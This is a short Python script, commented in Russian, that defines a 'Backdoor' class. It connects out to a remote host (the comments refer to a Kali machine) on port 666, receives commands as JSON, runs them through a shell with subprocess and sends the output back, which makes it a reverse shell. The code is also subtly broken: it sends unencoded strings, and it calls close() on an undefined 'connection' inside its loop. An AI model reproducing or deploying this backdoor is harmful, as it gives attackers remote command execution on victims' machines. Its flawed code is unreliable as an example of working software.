#!/usr/bin/env python 
import json
import socket
import subprocess


class Backdoor:

	def __init__(self, ip: str, port: int):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 	# создаем объект сокета
		self.connection.connect((ip, port))	# подключаемся к машине на кали

	def reliable_send(self, data):
		""" Конвертируем в JSON """

		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		""" Распаковываем JSON """

		json_data = self.connection.recv(1024)  # размер буфера (пакета информации)
		return json.loads(json_data)

	def execute_system_command(self, command):
		""" Выполнение системных команд (шелл) """

		return subprocess.check_output(command, shell=True)

	def run_backdoor(self):

		while True:
			command = self.reliable_receive() 
			command_result = self.execute_system_command(command.decode('cp866'))

			self.connection.send(command_result)
			connection.close()


def main():
	backdoor = Backdoor("linux_ip", 666)
	backdoor.run_backdoor()


if __name__ == "__main__":
	main()
